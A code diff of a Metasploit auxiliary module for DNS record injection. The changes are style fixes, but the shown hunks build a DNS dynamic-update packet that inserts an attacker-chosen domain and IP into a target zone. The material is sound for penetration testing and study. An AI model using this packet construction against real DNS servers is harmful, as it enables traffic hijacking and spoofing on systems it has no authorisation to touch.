@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Auxiliary
             [
                 ['URL', 'http://www.tenable.com/plugins/index.php?view=single&id=35372'],
                 ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
-                ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/',
+                ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],
                 ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/DNSInject.py']
             ],
         'License'        => MSF_LICENSE,
@@ -31,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
             ],
         'DefaultAction' => 'ADD'
     )
-
+    
     register_options(
         [
             OptString.new('DOMAIN', [true, 'The domain name']),
@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # DNS protocol converts domain to string_size+\x03+binary_string. eg. rubyfu.net = \x06rubyfu\x03net
   def domain_to_raw(domain_name)
-    return domain_name.split('.').map do |part|
+    domain_name.split('.').map do |part|
       part_size  = '%02x' % part.size
       domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
       part_size + domain2hex
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Converts IP address to hex format with eliminating the Dots as DNS protocol does.
   def ip_to_hex(ip_addr)
-    return ip_addr.split(".").map(&:to_i).pack("C*")
+    ip_addr.split(".").map(&:to_i).pack("C*")
   end
 
   #
@@ -91,39 +91,39 @@ class MetasploitModule < Msf::Auxiliary
 
     # Transaction ID: 0x0000
     "\x00\x00" +
-        # Flags: 0x2800 Dynamic update
-        "\x28\x00" +
-        # Zones: 1
-        "\x00\x01" +
-        # Prerequisites: 0
-        "\x00\x00" +
-        # Updates: 1
-        "\x00\x01" +
-        # Additional RRs: 0
-        "\x00\x00" +
-        # Zone
-        #   <DOMAIN>: type SOA, class IN
-        #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
-        domain_to_raw(domain) + "\x00" +
-        #   Type: SOA (Start Of a zone of Authority) (6)
-        "\x00\x06" +
-        #   Class: IN (0x0001)
-        "\x00\x01" +
+    # Flags: 0x2800 Dynamic update
+    "\x28\x00" +
+    # Zones: 1
+    "\x00\x01" +
+    # Prerequisites: 0
+    "\x00\x00" +
+    # Updates: 1
+    "\x00\x01" +
+    # Additional RRs: 0
+    "\x00\x00" +
+    # Zone
+    #   <DOMAIN>: type SOA, class IN
+    #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
+    domain_to_raw(domain) + "\x00" +
+    #   Type: SOA (Start Of a zone of Authority) (6)
+    "\x00\x06" +
+    #   Class: IN (0x0001)
+    "\x00\x01" +
 
-        # Updates
-        #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
-        #   Name: <ATTACKER_DOMAIN>
-        domain_to_raw(attacker_domain) + "\x00" +
-        #   Type: _type
-        _type +
-        #   Class: _class
-        _class +
-        #   Time to live: _ttl
-        _ttl +
-        #   Data length: _datalen
-        _datalen +
-        #   Address: <ATTACKER_IP>
-        ip_to_hex(attacker_ip)
+    # Updates
+    #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
+    #   Name: <ATTACKER_DOMAIN>
+    domain_to_raw(attacker_domain) + "\x00" +
+    #   Type: _type
+    _type +
+    #   Class: _class
+    _class +
+    #   Time to live: _ttl
+    _ttl +
+    #   Data length: _datalen
+    _datalen +
+    #   Address: <ATTACKER_IP>
+    ip_to_hex(attacker_ip)
   end
 
   def send_udp
